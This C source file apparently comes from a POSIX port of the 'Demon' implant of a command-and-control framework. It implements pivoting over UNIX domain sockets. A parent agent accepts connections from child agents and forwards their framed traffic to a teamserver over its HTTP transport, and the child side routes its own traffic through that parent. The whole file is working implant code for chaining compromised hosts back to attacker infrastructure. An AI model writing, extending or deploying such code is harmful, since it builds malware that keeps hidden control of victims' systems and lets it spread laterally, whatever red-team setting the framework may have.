/*
 * Pivot.c — UNIX domain socket pivot transport for the POSIX Demon.
 *
 * The Windows Demon uses SMB named pipes for pivoting.  On POSIX we use
 * UNIX domain sockets (AF_UNIX) as the pivot channel — conceptually the
 * same: a local IPC mechanism that lets a child agent route traffic through
 * a parent agent.
 *
 * A "pivot parent" agent listens on a UNIX socket path and routes frames
 * to/from the teamserver on behalf of child agents that connect to it.
 *
 * Protocol (identical binary framing as the HTTP transport):
 *   [4] frame_size (uint32 LE, = everything after this field)
 *   [4] MAGIC
 *   [4] AgentID
 *   [N] payload
 */

#include "DemonPosix.h"
#include <sys/un.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PIVOT_SOCK_BACKLOG  8

/* ── Global pivot state (only used when acting as pivot parent) ───── */
static int           g_listen_fd = -1;
static pthread_t     g_accept_thread;
static volatile bool g_accept_running = false;

/* ── Internal helpers ─────────────────────────────────────────────── */

static int recv_all(int fd, uint8_t *buf, size_t len)
{
    size_t total = 0;
    while (total < len) {
        ssize_t n = recv(fd, buf + total, len - total, 0);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

static int send_all(int fd, const uint8_t *buf, size_t len)
{
    size_t total = 0;
    while (total < len) {
        ssize_t n = send(fd, buf + total, len - total, 0);
        if (n < 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

/* ── Per-child pivot relay thread ────────────────────────────────── */
typedef struct {
    int      child_fd;
    uint32_t child_agent_id;
} PivotRelayArg;

static void *pivot_relay_thread(void *arg)
{
    PivotRelayArg *pra = (PivotRelayArg *)arg;
    int child_fd = pra->child_fd;
    free(pra);

    uint8_t hdr[8]; /* SIZE(4) + ... we read SIZE first */

    while (true) {
        /* Read the 4-byte SIZE field from child */
        if (recv_all(child_fd, hdr, 4) < 0) break;

        uint32_t frame_body_sz =
            (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
            ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);

        if (frame_body_sz == 0 || frame_body_sz > DEMON_MAX_RESPONSE_LENGTH) break;

        /* Read the rest of the frame */
        uint8_t *frame = (uint8_t *)malloc(4 + frame_body_sz);
        if (!frame) break;
        memcpy(frame, hdr, 4);
        if (recv_all(child_fd, frame + 4, frame_body_sz) < 0) { free(frame); break; }

        /* Forward to the teamserver via our HTTP transport */
        uint8_t *resp     = NULL;
        size_t   resp_len = 0;
        if (TransportSendRecv(frame, 4 + frame_body_sz, &resp, &resp_len) == 0 && resp) {
            /* Relay teamserver response back to child */
            uint32_t rsz_le = (uint32_t)resp_len;
            /* The response already has the SIZE field; send it as-is */
            send_all(child_fd, resp, resp_len);
            free(resp);
        }
        free(frame);
    }

    close(child_fd);
    return NULL;
}

/* ── Accept loop for pivot parent ────────────────────────────────── */
static void *pivot_accept_loop(void *arg)
{
    (void)arg;
    while (g_accept_running && g_listen_fd >= 0) {
        struct sockaddr_un addr;
        socklen_t addrlen = sizeof(addr);
        int child_fd = accept(g_listen_fd, (struct sockaddr *)&addr, &addrlen);
        if (child_fd < 0) {
            if (!g_accept_running) break;
            continue;
        }

        DEMON_LOG("Pivot: accepted child connection fd=%d", child_fd);

        PivotRelayArg *pra = (PivotRelayArg *)malloc(sizeof(PivotRelayArg));
        pra->child_fd       = child_fd;
        pra->child_agent_id = 0; /* will be parsed from first packet */

        /* Create a relay thread for this child */
        PIVOT_LINK *link = (PIVOT_LINK *)calloc(1, sizeof(PIVOT_LINK));
        link->SockFd     = child_fd;
        link->Active     = true;

        pthread_t relay_thread;
        pthread_create(&relay_thread, NULL, pivot_relay_thread, pra);
        pthread_detach(relay_thread);

        link->Thread = relay_thread;

        /* Prepend to the links list */
        link->Next = DemonInstance->Transport.Links;
        DemonInstance->Transport.Links = link;
    }
    return NULL;
}

/* ── Start listening as a pivot parent ───────────────────────────── */
bool PivotListen(const char *socket_path)
{
    g_listen_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (g_listen_fd < 0) {
        DEMON_LOG("pivot socket() failed: %s", strerror(errno));
        return false;
    }

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path)-1);
    unlink(socket_path); /* remove stale socket */

    if (bind(g_listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        DEMON_LOG("pivot bind() failed: %s", strerror(errno));
        close(g_listen_fd); g_listen_fd = -1;
        return false;
    }

    if (listen(g_listen_fd, PIVOT_SOCK_BACKLOG) < 0) {
        DEMON_LOG("pivot listen() failed: %s", strerror(errno));
        close(g_listen_fd); g_listen_fd = -1;
        return false;
    }

    g_accept_running = true;
    pthread_create(&g_accept_thread, NULL, pivot_accept_loop, NULL);
    DEMON_LOG("Pivot: listening on %s", socket_path);
    return true;
}

/* ── Connect as a pivot child ────────────────────────────────────── */
bool PivotConnect(const char *socket_path)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return false;

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path)-1);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        DEMON_LOG("pivot connect() to %s failed: %s", socket_path, strerror(errno));
        close(fd);
        return false;
    }

    DemonInstance->Transport.PivotSock = fd;
    DemonInstance->Transport.IsPivot   = true;
    DEMON_LOG("Pivot: connected to %s", socket_path);
    return true;
}

void PivotDisconnect(void)
{
    if (DemonInstance->Transport.PivotSock >= 0) {
        close(DemonInstance->Transport.PivotSock);
        DemonInstance->Transport.PivotSock = -1;
        DemonInstance->Transport.IsPivot   = false;
    }

    /* Shut down the accept loop if we are a parent */
    g_accept_running = false;
    if (g_listen_fd >= 0) {
        close(g_listen_fd);
        g_listen_fd = -1;
    }
}

/*
 * PivotSendRecv — used by RuntimeLoop when IsPivot == true.
 * Sends the frame to the parent pivot over the UNIX socket and reads
 * the teamserver's response back.
 */
int PivotSendRecv(const uint8_t *data, size_t len,
                  uint8_t **resp, size_t *resp_len)
{
    int fd = DemonInstance->Transport.PivotSock;
    if (fd < 0) return -1;

    if (send_all(fd, data, len) < 0) return -1;

    /* Read response: first 4 bytes = SIZE */
    uint8_t sz_buf[4];
    if (recv_all(fd, sz_buf, 4) < 0) return -1;

    uint32_t body_sz =
        (uint32_t)sz_buf[0] | ((uint32_t)sz_buf[1]<<8) |
        ((uint32_t)sz_buf[2]<<16) | ((uint32_t)sz_buf[3]<<24);

    if (body_sz == 0 || body_sz > DEMON_MAX_RESPONSE_LENGTH) return -1;

    uint8_t *buf = (uint8_t *)malloc(4 + body_sz);
    if (!buf) return -1;
    memcpy(buf, sz_buf, 4);
    if (recv_all(fd, buf + 4, body_sz) < 0) { free(buf); return -1; }

    *resp     = buf;
    *resp_len = 4 + body_sz;
    return 0;
}
